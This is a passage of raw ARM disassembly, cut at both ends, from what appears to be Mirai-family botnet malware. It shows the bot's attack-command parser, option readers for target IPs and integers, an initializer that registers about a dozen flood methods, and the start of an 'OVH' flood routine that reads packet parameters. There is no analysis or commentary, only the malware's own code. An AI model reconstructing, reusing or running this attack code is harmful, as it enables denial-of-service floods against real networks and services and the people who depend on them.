    a228:	0a00000e 	beq	a268 <attack_start+0xcc>
    a22c:	e59f3060 	ldr	r3, [pc, #96]	; a294 <attack_start+0xf8>
    a230:	e5932000 	ldr	r2, [r3]
    a234:	e592c000 	ldr	ip, [r2]
    a238:	e5dc3004 	ldrb	r3, [ip, #4]
    a23c:	e1530007 	cmp	r3, r7
    a240:	11a00005 	movne	r0, r5
    a244:	1a000004 	bne	a25c <attack_start+0xc0>
    a248:	ea000008 	b	a270 <attack_start+0xd4>
    a24c:	e792c100 	ldr	ip, [r2, r0, lsl #2]
    a250:	e5dc3004 	ldrb	r3, [ip, #4]
    a254:	e1530007 	cmp	r3, r7
    a258:	0a000004 	beq	a270 <attack_start+0xd4>
    a25c:	e2800001 	add	r0, r0, #1
    a260:	e1500001 	cmp	r0, r1
    a264:	1afffff8 	bne	a24c <attack_start+0xb0>
    a268:	e3a00000 	mov	r0, #0
    a26c:	eb0040d5 	bl	1a5c8 <__GI_exit>
    a270:	e1a0000a 	mov	r0, sl
    a274:	e1a01009 	mov	r1, r9
    a278:	e1a02008 	mov	r2, r8
    a27c:	e59d3024 	ldr	r3, [sp, #36]	; 0x24
    a280:	e59cc000 	ldr	ip, [ip]
    a284:	e1a0e00f 	mov	lr, pc
    a288:	e12fff1c 	bx	ip
    a28c:	eafffff5 	b	a268 <attack_start+0xcc>
    a290:	00029a68 	andeq	r9, r2, r8, ror #20
    a294:	00029a6c 	andeq	r9, r2, ip, ror #20

0000a298 <attack_parse>:
    a298:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a29c:	e3510003 	cmp	r1, #3
    a2a0:	e24dd01c 	sub	sp, sp, #28
    a2a4:	e1a04001 	mov	r4, r1
    a2a8:	e1a05000 	mov	r5, r0
    a2ac:	8a000002 	bhi	a2bc <attack_parse+0x24>
    a2b0:	e28dd01c 	add	sp, sp, #28
    a2b4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a2b8:	e12fff1e 	bx	lr
    a2bc:	e5901000 	ldr	r1, [r0]
    a2c0:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    a2c4:	e1a03c21 	lsr	r3, r1, #24
    a2c8:	e1833420 	orr	r3, r3, r0, lsr #8
    a2cc:	e2012cff 	and	r2, r1, #65280	; 0xff00
    a2d0:	e1833402 	orr	r3, r3, r2, lsl #8
    a2d4:	e3540004 	cmp	r4, #4
    a2d8:	e183bc01 	orr	fp, r3, r1, lsl #24
    a2dc:	0afffff3 	beq	a2b0 <attack_parse+0x18>
    a2e0:	e5d52004 	ldrb	r2, [r5, #4]
    a2e4:	e3540005 	cmp	r4, #5
    a2e8:	e58d2014 	str	r2, [sp, #20]
    a2ec:	0affffef 	beq	a2b0 <attack_parse+0x18>
    a2f0:	e5d59005 	ldrb	r9, [r5, #5]
    a2f4:	e3590000 	cmp	r9, #0
    a2f8:	0affffec 	beq	a2b0 <attack_parse+0x18>
    a2fc:	e1a03109 	lsl	r3, r9, #2
    a300:	e0837009 	add	r7, r3, r9
    a304:	e2443006 	sub	r3, r4, #6
    a308:	e1530007 	cmp	r3, r7
    a30c:	3affffe7 	bcc	a2b0 <attack_parse+0x18>
    a310:	e1a00009 	mov	r0, r9
    a314:	e3a01018 	mov	r1, #24
    a318:	e1a06003 	mov	r6, r3
    a31c:	eb003d62 	bl	198ac <calloc>
    a320:	e58d000c 	str	r0, [sp, #12]
    a324:	e59dc00c 	ldr	ip, [sp, #12]
    a328:	e0677004 	rsb	r7, r7, r4
    a32c:	e285000b 	add	r0, r5, #11
    a330:	e5101005 	ldr	r1, [r0, #-5]
    a334:	e58c1010 	str	r1, [ip, #16]
    a338:	e2473006 	sub	r3, r7, #6
    a33c:	e5502001 	ldrb	r2, [r0, #-1]
    a340:	e2466005 	sub	r6, r6, #5
    a344:	e1560003 	cmp	r6, r3
    a348:	e3a03002 	mov	r3, #2
    a34c:	e1a04000 	mov	r4, r0
    a350:	e5cc2014 	strb	r2, [ip, #20]
    a354:	e58c1004 	str	r1, [ip, #4]
    a358:	e1cc30b0 	strh	r3, [ip]
    a35c:	e2800005 	add	r0, r0, #5
    a360:	e28cc018 	add	ip, ip, #24
    a364:	1afffff1 	bne	a330 <attack_parse+0x98>
    a368:	e3560000 	cmp	r6, #0
    a36c:	0a00003e 	beq	a46c <attack_parse+0x1d4>
    a370:	e5d45000 	ldrb	r5, [r4]
    a374:	e3550000 	cmp	r5, #0
    a378:	e2478007 	sub	r8, r7, #7
    a37c:	01a06005 	moveq	r6, r5
    a380:	0a000030 	beq	a448 <attack_parse+0x1b0>
    a384:	e1a00005 	mov	r0, r5
    a388:	e3a01008 	mov	r1, #8
    a38c:	eb003d46 	bl	198ac <calloc>
    a390:	e3580000 	cmp	r8, #0
    a394:	e1a06000 	mov	r6, r0
    a398:	0a000033 	beq	a46c <attack_parse+0x1d4>
    a39c:	e5d43001 	ldrb	r3, [r4, #1]
    a3a0:	e3570008 	cmp	r7, #8
    a3a4:	e5c03004 	strb	r3, [r0, #4]
    a3a8:	e2843001 	add	r3, r4, #1
    a3ac:	0a00002e 	beq	a46c <attack_parse+0x1d4>
    a3b0:	e5d34001 	ldrb	r4, [r3, #1]
    a3b4:	e2478009 	sub	r8, r7, #9
    a3b8:	e1580004 	cmp	r8, r4
    a3bc:	e2831001 	add	r1, r3, #1
    a3c0:	a3a02000 	movge	r2, #0
    a3c4:	a2817001 	addge	r7, r1, #1
    a3c8:	a1a0a000 	movge	sl, r0
    a3cc:	a58d2010 	strge	r2, [sp, #16]
    a3d0:	aa00000d 	bge	a40c <attack_parse+0x174>
    a3d4:	ea000024 	b	a46c <attack_parse+0x1d4>
    a3d8:	e0582004 	subs	r2, r8, r4
    a3dc:	0a000022 	beq	a46c <attack_parse+0x1d4>
    a3e0:	e7d43007 	ldrb	r3, [r4, r7]
    a3e4:	e0840007 	add	r0, r4, r7
    a3e8:	e2522001 	subs	r2, r2, #1
    a3ec:	e5ca3004 	strb	r3, [sl, #4]
    a3f0:	e2803001 	add	r3, r0, #1
    a3f4:	e2428001 	sub	r8, r2, #1
    a3f8:	e2837001 	add	r7, r3, #1
    a3fc:	0a00001a 	beq	a46c <attack_parse+0x1d4>
    a400:	e5d04001 	ldrb	r4, [r0, #1]
    a404:	e1580004 	cmp	r8, r4
    a408:	ba000017 	blt	a46c <attack_parse+0x1d4>
    a40c:	e3a01001 	mov	r1, #1
    a410:	e2840001 	add	r0, r4, #1
    a414:	eb003d24 	bl	198ac <calloc>
    a418:	e59d3010 	ldr	r3, [sp, #16]
    a41c:	e58a0000 	str	r0, [sl]
    a420:	e2833001 	add	r3, r3, #1
    a424:	e1a02004 	mov	r2, r4
    a428:	e1a01007 	mov	r1, r7
    a42c:	e58d3010 	str	r3, [sp, #16]
    a430:	eb00345a 	bl	175a0 <util_memcpy>
    a434:	e59d2010 	ldr	r2, [sp, #16]
    a438:	e1a03182 	lsl	r3, r2, #3
    a43c:	e1520005 	cmp	r2, r5
    a440:	e086a003 	add	sl, r6, r3
    a444:	1affffe3 	bne	a3d8 <attack_parse+0x140>
    a448:	eb00389d 	bl	186c4 <__GI___errno_location>
    a44c:	e3a03000 	mov	r3, #0
    a450:	e5803000 	str	r3, [r0]
    a454:	e59d1014 	ldr	r1, [sp, #20]
    a458:	e1a0000b 	mov	r0, fp
    a45c:	e1a02009 	mov	r2, r9
    a460:	e59d300c 	ldr	r3, [sp, #12]
    a464:	e88d0060 	stm	sp, {r5, r6}
    a468:	ebffff4b 	bl	a19c <attack_start>
    a46c:	e59d300c 	ldr	r3, [sp, #12]
    a470:	e3530000 	cmp	r3, #0
    a474:	11a00003 	movne	r0, r3
    a478:	1b003ee4 	blne	1a010 <free>
    a47c:	e3560000 	cmp	r6, #0
    a480:	0affff8a 	beq	a2b0 <attack_parse+0x18>
    a484:	e3550000 	cmp	r5, #0
    a488:	0a000006 	beq	a4a8 <attack_parse+0x210>
    a48c:	e3a04000 	mov	r4, #0
    a490:	e7960184 	ldr	r0, [r6, r4, lsl #3]
    a494:	e3500000 	cmp	r0, #0
    a498:	e2844001 	add	r4, r4, #1
    a49c:	1b003edb 	blne	1a010 <free>
    a4a0:	e1550004 	cmp	r5, r4
    a4a4:	1afffff9 	bne	a490 <attack_parse+0x1f8>
    a4a8:	e1a00006 	mov	r0, r6
    a4ac:	eb003ed7 	bl	1a010 <free>
    a4b0:	eaffff7e 	b	a2b0 <attack_parse+0x18>

0000a4b4 <attack_get_opt_ip>:
    a4b4:	e3500000 	cmp	r0, #0
    a4b8:	e92d4010 	push	{r4, lr}
    a4bc:	e1a04003 	mov	r4, r3
    a4c0:	0a00000d 	beq	a4fc <attack_get_opt_ip+0x48>
    a4c4:	e5d13004 	ldrb	r3, [r1, #4]
    a4c8:	e1530002 	cmp	r3, r2
    a4cc:	1281c008 	addne	ip, r1, #8
    a4d0:	13a0e000 	movne	lr, #0
    a4d4:	1a000004 	bne	a4ec <attack_get_opt_ip+0x38>
    a4d8:	ea00000a 	b	a508 <attack_get_opt_ip+0x54>
    a4dc:	e5dc3004 	ldrb	r3, [ip, #4]
    a4e0:	e1520003 	cmp	r2, r3
    a4e4:	e28cc008 	add	ip, ip, #8
    a4e8:	0a000006 	beq	a508 <attack_get_opt_ip+0x54>
    a4ec:	e28ee001 	add	lr, lr, #1
    a4f0:	e15e0000 	cmp	lr, r0
    a4f4:	e1a0100c 	mov	r1, ip
    a4f8:	1afffff7 	bne	a4dc <attack_get_opt_ip+0x28>
    a4fc:	e1a00004 	mov	r0, r4
    a500:	e8bd4010 	pop	{r4, lr}
    a504:	e12fff1e 	bx	lr
    a508:	e5910000 	ldr	r0, [r1]
    a50c:	e3500000 	cmp	r0, #0
    a510:	0afffff9 	beq	a4fc <attack_get_opt_ip+0x48>
    a514:	eb0038b1 	bl	187e0 <__GI_inet_addr>
    a518:	e1a04000 	mov	r4, r0
    a51c:	eafffff6 	b	a4fc <attack_get_opt_ip+0x48>

0000a520 <attack_get_opt_int>:
    a520:	e3500000 	cmp	r0, #0
    a524:	e92d4010 	push	{r4, lr}
    a528:	e1a04003 	mov	r4, r3
    a52c:	0a00000d 	beq	a568 <attack_get_opt_int+0x48>
    a530:	e5d13004 	ldrb	r3, [r1, #4]
    a534:	e1530002 	cmp	r3, r2
    a538:	1281c008 	addne	ip, r1, #8
    a53c:	13a0e000 	movne	lr, #0
    a540:	1a000004 	bne	a558 <attack_get_opt_int+0x38>
    a544:	ea00000a 	b	a574 <attack_get_opt_int+0x54>
    a548:	e5dc3004 	ldrb	r3, [ip, #4]
    a54c:	e1520003 	cmp	r2, r3
    a550:	e28cc008 	add	ip, ip, #8
    a554:	0a000006 	beq	a574 <attack_get_opt_int+0x54>
    a558:	e28ee001 	add	lr, lr, #1
    a55c:	e150000e 	cmp	r0, lr
    a560:	e1a0100c 	mov	r1, ip
    a564:	1afffff7 	bne	a548 <attack_get_opt_int+0x28>
    a568:	e1a00004 	mov	r0, r4
    a56c:	e8bd4010 	pop	{r4, lr}
    a570:	e12fff1e 	bx	lr
    a574:	e5910000 	ldr	r0, [r1]
    a578:	e3500000 	cmp	r0, #0
    a57c:	0afffff9 	beq	a568 <attack_get_opt_int+0x48>
    a580:	e3a0100a 	mov	r1, #10
    a584:	eb003432 	bl	17654 <util_atoi>
    a588:	e1a04000 	mov	r4, r0
    a58c:	eafffff5 	b	a568 <attack_get_opt_int+0x48>

0000a590 <attack_init>:
    a590:	e92d40f0 	push	{r4, r5, r6, r7, lr}
    a594:	e3a01008 	mov	r1, #8
    a598:	e24dd004 	sub	sp, sp, #4
    a59c:	e3a00001 	mov	r0, #1
    a5a0:	eb003cc1 	bl	198ac <calloc>
    a5a4:	e59f4390 	ldr	r4, [pc, #912]	; a93c <attack_init+0x3ac>
    a5a8:	e5d41000 	ldrb	r1, [r4]
    a5ac:	e59f638c 	ldr	r6, [pc, #908]	; a940 <attack_init+0x3b0>
    a5b0:	e59f238c 	ldr	r2, [pc, #908]	; a944 <attack_init+0x3b4>
    a5b4:	e1a05000 	mov	r5, r0
    a5b8:	e3a03000 	mov	r3, #0
    a5bc:	e2811001 	add	r1, r1, #1
    a5c0:	e5960000 	ldr	r0, [r6]
    a5c4:	e5852000 	str	r2, [r5]
    a5c8:	e5c53004 	strb	r3, [r5, #4]
    a5cc:	e1a01101 	lsl	r1, r1, #2
    a5d0:	eb003d05 	bl	199ec <realloc>
    a5d4:	e5d43000 	ldrb	r3, [r4]
    a5d8:	e1a02000 	mov	r2, r0
    a5dc:	e7805103 	str	r5, [r0, r3, lsl #2]
    a5e0:	e3a01008 	mov	r1, #8
    a5e4:	e2833001 	add	r3, r3, #1
    a5e8:	e3a00001 	mov	r0, #1
    a5ec:	e5862000 	str	r2, [r6]
    a5f0:	e5c43000 	strb	r3, [r4]
    a5f4:	eb003cac 	bl	198ac <calloc>
    a5f8:	e5d41000 	ldrb	r1, [r4]
    a5fc:	e59f3344 	ldr	r3, [pc, #836]	; a948 <attack_init+0x3b8>
    a600:	e3a07001 	mov	r7, #1
    a604:	e1a05000 	mov	r5, r0
    a608:	e2811001 	add	r1, r1, #1
    a60c:	e5960000 	ldr	r0, [r6]
    a610:	e5853000 	str	r3, [r5]
    a614:	e5c57004 	strb	r7, [r5, #4]
    a618:	e1a01101 	lsl	r1, r1, #2
    a61c:	eb003cf2 	bl	199ec <realloc>
    a620:	e5d43000 	ldrb	r3, [r4]
    a624:	e1a02000 	mov	r2, r0
    a628:	e7805103 	str	r5, [r0, r3, lsl #2]
    a62c:	e3a01008 	mov	r1, #8
    a630:	e0833007 	add	r3, r3, r7
    a634:	e1a00007 	mov	r0, r7
    a638:	e5c43000 	strb	r3, [r4]
    a63c:	e5862000 	str	r2, [r6]
    a640:	eb003c99 	bl	198ac <calloc>
    a644:	e5d41000 	ldrb	r1, [r4]
    a648:	e59f22fc 	ldr	r2, [pc, #764]	; a94c <attack_init+0x3bc>
    a64c:	e1a05000 	mov	r5, r0
    a650:	e3a03002 	mov	r3, #2
    a654:	e0811007 	add	r1, r1, r7
    a658:	e5960000 	ldr	r0, [r6]
    a65c:	e5852000 	str	r2, [r5]
    a660:	e5c53004 	strb	r3, [r5, #4]
    a664:	e1a01101 	lsl	r1, r1, #2
    a668:	eb003cdf 	bl	199ec <realloc>
    a66c:	e5d43000 	ldrb	r3, [r4]
    a670:	e1a02000 	mov	r2, r0
    a674:	e7805103 	str	r5, [r0, r3, lsl #2]
    a678:	e3a01008 	mov	r1, #8
    a67c:	e0833007 	add	r3, r3, r7
    a680:	e1a00007 	mov	r0, r7
    a684:	e5c43000 	strb	r3, [r4]
    a688:	e5862000 	str	r2, [r6]
    a68c:	eb003c86 	bl	198ac <calloc>
    a690:	e5d41000 	ldrb	r1, [r4]
    a694:	e59f22b4 	ldr	r2, [pc, #692]	; a950 <attack_init+0x3c0>
    a698:	e1a05000 	mov	r5, r0
    a69c:	e3a03003 	mov	r3, #3
    a6a0:	e0811007 	add	r1, r1, r7
    a6a4:	e5960000 	ldr	r0, [r6]
    a6a8:	e5852000 	str	r2, [r5]
    a6ac:	e5c53004 	strb	r3, [r5, #4]
    a6b0:	e1a01101 	lsl	r1, r1, #2
    a6b4:	eb003ccc 	bl	199ec <realloc>
    a6b8:	e5d43000 	ldrb	r3, [r4]
    a6bc:	e1a02000 	mov	r2, r0
    a6c0:	e7805103 	str	r5, [r0, r3, lsl #2]
    a6c4:	e3a01008 	mov	r1, #8
    a6c8:	e0833007 	add	r3, r3, r7
    a6cc:	e1a00007 	mov	r0, r7
    a6d0:	e5c43000 	strb	r3, [r4]
    a6d4:	e5862000 	str	r2, [r6]
    a6d8:	eb003c73 	bl	198ac <calloc>
    a6dc:	e5d41000 	ldrb	r1, [r4]
    a6e0:	e59f226c 	ldr	r2, [pc, #620]	; a954 <attack_init+0x3c4>
    a6e4:	e1a05000 	mov	r5, r0
    a6e8:	e3a03004 	mov	r3, #4
    a6ec:	e0811007 	add	r1, r1, r7
    a6f0:	e5960000 	ldr	r0, [r6]
    a6f4:	e5852000 	str	r2, [r5]
    a6f8:	e5c53004 	strb	r3, [r5, #4]
    a6fc:	e1a01101 	lsl	r1, r1, #2
    a700:	eb003cb9 	bl	199ec <realloc>
    a704:	e5d43000 	ldrb	r3, [r4]
    a708:	e1a02000 	mov	r2, r0
    a70c:	e7805103 	str	r5, [r0, r3, lsl #2]
    a710:	e3a01008 	mov	r1, #8
    a714:	e0833007 	add	r3, r3, r7
    a718:	e1a00007 	mov	r0, r7
    a71c:	e5c43000 	strb	r3, [r4]
    a720:	e5862000 	str	r2, [r6]
    a724:	eb003c60 	bl	198ac <calloc>
    a728:	e5d41000 	ldrb	r1, [r4]
    a72c:	e59f2224 	ldr	r2, [pc, #548]	; a958 <attack_init+0x3c8>
    a730:	e1a05000 	mov	r5, r0
    a734:	e3a03005 	mov	r3, #5
    a738:	e0811007 	add	r1, r1, r7
    a73c:	e5960000 	ldr	r0, [r6]
    a740:	e5852000 	str	r2, [r5]
    a744:	e5c53004 	strb	r3, [r5, #4]
    a748:	e1a01101 	lsl	r1, r1, #2
    a74c:	eb003ca6 	bl	199ec <realloc>
    a750:	e5d43000 	ldrb	r3, [r4]
    a754:	e1a02000 	mov	r2, r0
    a758:	e7805103 	str	r5, [r0, r3, lsl #2]
    a75c:	e3a01008 	mov	r1, #8
    a760:	e0833007 	add	r3, r3, r7
    a764:	e1a00007 	mov	r0, r7
    a768:	e5c43000 	strb	r3, [r4]
    a76c:	e5862000 	str	r2, [r6]
    a770:	eb003c4d 	bl	198ac <calloc>
    a774:	e5d41000 	ldrb	r1, [r4]
    a778:	e59f21dc 	ldr	r2, [pc, #476]	; a95c <attack_init+0x3cc>
    a77c:	e1a05000 	mov	r5, r0
    a780:	e3a03006 	mov	r3, #6
    a784:	e0811007 	add	r1, r1, r7
    a788:	e5960000 	ldr	r0, [r6]
    a78c:	e5852000 	str	r2, [r5]
    a790:	e5c53004 	strb	r3, [r5, #4]
    a794:	e1a01101 	lsl	r1, r1, #2
    a798:	eb003c93 	bl	199ec <realloc>
    a79c:	e5d43000 	ldrb	r3, [r4]
    a7a0:	e1a02000 	mov	r2, r0
    a7a4:	e7805103 	str	r5, [r0, r3, lsl #2]
    a7a8:	e3a01008 	mov	r1, #8
    a7ac:	e0833007 	add	r3, r3, r7
    a7b0:	e1a00007 	mov	r0, r7
    a7b4:	e5c43000 	strb	r3, [r4]
    a7b8:	e5862000 	str	r2, [r6]
    a7bc:	eb003c3a 	bl	198ac <calloc>
    a7c0:	e5d41000 	ldrb	r1, [r4]
    a7c4:	e59f2194 	ldr	r2, [pc, #404]	; a960 <attack_init+0x3d0>
    a7c8:	e1a05000 	mov	r5, r0
    a7cc:	e3a03007 	mov	r3, #7
    a7d0:	e0811007 	add	r1, r1, r7
    a7d4:	e5960000 	ldr	r0, [r6]
    a7d8:	e5852000 	str	r2, [r5]
    a7dc:	e5c53004 	strb	r3, [r5, #4]
    a7e0:	e1a01101 	lsl	r1, r1, #2
    a7e4:	eb003c80 	bl	199ec <realloc>
    a7e8:	e5d43000 	ldrb	r3, [r4]
    a7ec:	e1a02000 	mov	r2, r0
    a7f0:	e7805103 	str	r5, [r0, r3, lsl #2]
    a7f4:	e3a01008 	mov	r1, #8
    a7f8:	e0833007 	add	r3, r3, r7
    a7fc:	e1a00007 	mov	r0, r7
    a800:	e5c43000 	strb	r3, [r4]
    a804:	e5862000 	str	r2, [r6]
    a808:	eb003c27 	bl	198ac <calloc>
    a80c:	e5d41000 	ldrb	r1, [r4]
    a810:	e59f214c 	ldr	r2, [pc, #332]	; a964 <attack_init+0x3d4>
    a814:	e1a05000 	mov	r5, r0
    a818:	e3a03009 	mov	r3, #9
    a81c:	e0811007 	add	r1, r1, r7
    a820:	e5960000 	ldr	r0, [r6]
    a824:	e5852000 	str	r2, [r5]
    a828:	e5c53004 	strb	r3, [r5, #4]
    a82c:	e1a01101 	lsl	r1, r1, #2
    a830:	eb003c6d 	bl	199ec <realloc>
    a834:	e5d43000 	ldrb	r3, [r4]
    a838:	e1a02000 	mov	r2, r0
    a83c:	e7805103 	str	r5, [r0, r3, lsl #2]
    a840:	e3a01008 	mov	r1, #8
    a844:	e0833007 	add	r3, r3, r7
    a848:	e1a00007 	mov	r0, r7
    a84c:	e5c43000 	strb	r3, [r4]
    a850:	e5862000 	str	r2, [r6]
    a854:	eb003c14 	bl	198ac <calloc>
    a858:	e5d41000 	ldrb	r1, [r4]
    a85c:	e59f2104 	ldr	r2, [pc, #260]	; a968 <attack_init+0x3d8>
    a860:	e1a05000 	mov	r5, r0
    a864:	e3a0300a 	mov	r3, #10
    a868:	e0811007 	add	r1, r1, r7
    a86c:	e5960000 	ldr	r0, [r6]
    a870:	e5852000 	str	r2, [r5]
    a874:	e5c53004 	strb	r3, [r5, #4]
    a878:	e1a01101 	lsl	r1, r1, #2
    a87c:	eb003c5a 	bl	199ec <realloc>
    a880:	e5d43000 	ldrb	r3, [r4]
    a884:	e1a02000 	mov	r2, r0
    a888:	e7805103 	str	r5, [r0, r3, lsl #2]
    a88c:	e3a01008 	mov	r1, #8
    a890:	e0833007 	add	r3, r3, r7
    a894:	e1a00007 	mov	r0, r7
    a898:	e5c43000 	strb	r3, [r4]
    a89c:	e5862000 	str	r2, [r6]
    a8a0:	eb003c01 	bl	198ac <calloc>
    a8a4:	e5d41000 	ldrb	r1, [r4]
    a8a8:	e59f20bc 	ldr	r2, [pc, #188]	; a96c <attack_init+0x3dc>
    a8ac:	e1a05000 	mov	r5, r0
    a8b0:	e3a0300b 	mov	r3, #11
    a8b4:	e0811007 	add	r1, r1, r7
    a8b8:	e5960000 	ldr	r0, [r6]
    a8bc:	e5852000 	str	r2, [r5]
    a8c0:	e5c53004 	strb	r3, [r5, #4]
    a8c4:	e1a01101 	lsl	r1, r1, #2
    a8c8:	eb003c47 	bl	199ec <realloc>
    a8cc:	e5d43000 	ldrb	r3, [r4]
    a8d0:	e1a02000 	mov	r2, r0
    a8d4:	e7805103 	str	r5, [r0, r3, lsl #2]
    a8d8:	e3a01008 	mov	r1, #8
    a8dc:	e0833007 	add	r3, r3, r7
    a8e0:	e1a00007 	mov	r0, r7
    a8e4:	e5c43000 	strb	r3, [r4]
    a8e8:	e5862000 	str	r2, [r6]
    a8ec:	eb003bee 	bl	198ac <calloc>
    a8f0:	e5d41000 	ldrb	r1, [r4]
    a8f4:	e59f2074 	ldr	r2, [pc, #116]	; a970 <attack_init+0x3e0>
    a8f8:	e1a05000 	mov	r5, r0
    a8fc:	e3a03008 	mov	r3, #8
    a900:	e0811007 	add	r1, r1, r7
    a904:	e5960000 	ldr	r0, [r6]
    a908:	e5852000 	str	r2, [r5]
    a90c:	e5c53004 	strb	r3, [r5, #4]
    a910:	e1a01101 	lsl	r1, r1, #2
    a914:	eb003c34 	bl	199ec <realloc>
    a918:	e5d43000 	ldrb	r3, [r4]
    a91c:	e5860000 	str	r0, [r6]
    a920:	e7805103 	str	r5, [r0, r3, lsl #2]
    a924:	e0832007 	add	r2, r3, r7
    a928:	e1a00007 	mov	r0, r7
    a92c:	e5c42000 	strb	r2, [r4]
    a930:	e28dd004 	add	sp, sp, #4
    a934:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
    a938:	e12fff1e 	bx	lr
    a93c:	00029a68 	andeq	r9, r2, r8, ror #20
    a940:	00029a6c 	andeq	r9, r2, ip, ror #20
    a944:	0000d17c 	andeq	sp, r0, ip, ror r1
    a948:	0000cad0 	ldrdeq	ip, [r0], -r0
    a94c:	0000c424 	andeq	ip, r0, r4, lsr #8
    a950:	0000bd78 	andeq	fp, r0, r8, ror sp
    a954:	0000b6cc 	andeq	fp, r0, ip, asr #13
    a958:	0000b020 	andeq	fp, r0, r0, lsr #32
    a95c:	0000e384 	andeq	lr, r0, r4, lsl #7
    a960:	0000e0e4 	andeq	lr, r0, r4, ror #1
    a964:	0000d828 	andeq	sp, r0, r8, lsr #16
    a968:	0000de44 	andeq	sp, r0, r4, asr #28
    a96c:	0000a974 	andeq	sl, r0, r4, ror r9
    a970:	000081d0 	ldrdeq	r8, [r0], -r0

0000a974 <attack_method_ovh>:
    a974:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    a978:	e1a08001 	mov	r8, r1
    a97c:	e24dd074 	sub	sp, sp, #116	; 0x74
    a980:	e3a01004 	mov	r1, #4
    a984:	e1a04002 	mov	r4, r2
    a988:	e1a05003 	mov	r5, r3
    a98c:	e1a07000 	mov	r7, r0
    a990:	eb003bc5 	bl	198ac <calloc>
    a994:	e1a01005 	mov	r1, r5
    a998:	e3a02002 	mov	r2, #2
    a99c:	e3a03000 	mov	r3, #0
    a9a0:	e1a09000 	mov	r9, r0
    a9a4:	e1a00004 	mov	r0, r4
    a9a8:	ebfffedc 	bl	a520 <attack_get_opt_int>
    a9ac:	e3a03801 	mov	r3, #65536	; 0x10000
    a9b0:	e1a0c000 	mov	ip, r0
    a9b4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    a9b8:	e2433001 	sub	r3, r3, #1
    a9bc:	e3a02003 	mov	r2, #3
    a9c0:	e1a01005 	mov	r1, r5
    a9c4:	e1a00004 	mov	r0, r4
    a9c8:	e58dc048 	str	ip, [sp, #72]	; 0x48
    a9cc:	ebfffed3 	bl	a520 <attack_get_opt_int>
    a9d0:	e1a01005 	mov	r1, r5
    a9d4:	e58d0024 	str	r0, [sp, #36]	; 0x24
    a9d8:	e3a02004 	mov	r2, #4
    a9dc:	e3a03040 	mov	r3, #64	; 0x40
    a9e0:	e1a00004 	mov	r0, r4
    a9e4:	ebfffecd 	bl	a520 <attack_get_opt_int>
    a9e8:	e1a0c000 	mov	ip, r0
    a9ec:	e20cc0ff 	and	ip, ip, #255	; 0xff
    a9f0:	e1a01005 	mov	r1, r5
    a9f4:	e3a02005 	mov	r2, #5
    a9f8:	e3a03001 	mov	r3, #1
    a9fc:	e1a00004 	mov	r0, r4
    aa00:	e58dc050 	str	ip, [sp, #80]	; 0x50
    aa04:	ebfffec5 	bl	a520 <attack_get_opt_int>
    aa08:	e3a03801 	mov	r3, #65536	; 0x10000
    aa0c:	e1a0c000 	mov	ip, r0
    aa10:	e20cc0ff 	and	ip, ip, #255	; 0xff
    aa14:	e2433001 	sub	r3, r3, #1
    aa18:	e3a02006 	mov	r2, #6
    aa1c:	e1a01005 	mov	r1, r5
    aa20:	e1a00004 	mov	r0, r4
    aa24:	e58dc054 	str	ip, [sp, #84]	; 0x54
    aa28:	ebfffebc 	bl	a520 <attack_get_opt_int>
    aa2c:	e3a03801 	mov	r3, #65536	; 0x10000
    aa30:	e1a01005 	mov	r1, r5
    aa34:	e2433001 	sub	r3, r3, #1
    aa38:	e3a02007 	mov	r2, #7
    aa3c:	e1a0b000 	mov	fp, r0
    aa40:	e1a00004 	mov	r0, r4
    aa44:	ebfffeb5 	bl	a520 <attack_get_opt_int>
    aa48:	e3a03801 	mov	r3, #65536	; 0x10000
    aa4c:	e1a01005 	mov	r1, r5
    aa50:	e2433001 	sub	r3, r3, #1
    aa54:	e3a02011 	mov	r2, #17
    aa58:	e1a06000 	mov	r6, r0
    aa5c:	e1a00004 	mov	r0, r4
    aa60:	ebfffeae 	bl	a520 <attack_get_opt_int>
    aa64:	e1a01005 	mov	r1, r5
    aa68:	e58d0028 	str	r0, [sp, #40]	; 0x28
    aa6c:	e3a02012 	mov	r2, #18
    aa70:	e3a03000 	mov	r3, #0
    aa74:	e1a00004 	mov	r0, r4
    aa78:	ebfffea8 	bl	a520 <attack_get_opt_int>
    aa7c:	e1a01005 	mov	r1, r5
    aa80:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    aa84:	e3a0200b 	mov	r2, #11
    aa88:	e3a03000 	mov	r3, #0
    aa8c:	e1a00004 	mov	r0, r4
    aa90:	ebfffea2 	bl	a520 <attack_get_opt_int>
    aa94:	e1a01005 	mov	r1, r5
    aa98:	e58d0030 	str	r0, [sp, #48]	; 0x30
    aa9c:	e3a0200c 	mov	r2, #12
    aaa0:	e3a03000 	mov	r3, #0
    aaa4:	e1a00004 	mov	r0, r4
    aaa8:	ebfffe9c 	bl	a520 <attack_get_opt_int>
    aaac:	e1a01005 	mov	r1, r5
    aab0:	e58d0034 	str	r0, [sp, #52]	; 0x34
    aab4:	e3a0200d 	mov	r2, #13
    aab8:	e3a03000 	mov	r3, #0
    aabc:	e1a00004 	mov	r0, r4
    aac0:	ebfffe96 	bl	a520 <attack_get_opt_int>
    aac4:	e1a01005 	mov	r1, r5
    aac8:	e58d0038 	str	r0, [sp, #56]	; 0x38
    aacc:	e3a0200e 	mov	r2, #14
    aad0:	e3a03000 	mov	r3, #0
    aad4:	e1a00004 	mov	r0, r4
    aad8:	ebfffe90 	bl	a520 <attack_get_opt_int>
    aadc:	e1a01005 	mov	r1, r5
    aae0:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    aae4:	e3a0200f 	mov	r2, #15
    aae8:	e3a03000 	mov	r3, #0
    aaec:	e1a00004 	mov	r0, r4
    aaf0:	ebfffe8a 	bl	a520 <attack_get_opt_int>
    aaf4:	e1a01005 	mov	r1, r5
    aaf8:	e58d0040 	str	r0, [sp, #64]	; 0x40
    aafc:	e3a02010 	mov	r2, #16
    ab00:	e3a03000 	mov	r3, #0
    ab04:	e1a00004 	mov	r0, r4
    ab08:	ebfffe84 	bl	a520 <attack_get_opt_int>
    ab0c:	e59f2508 	ldr	r2, [pc, #1288]	; b01c <attack_method_ovh+0x6a8>
    ab10:	e58d0044 	str	r0, [sp, #68]	; 0x44
    ab14:	e5923000 	ldr	r3, [r2]
    ab18:	e1a01005 	mov	r1, r5
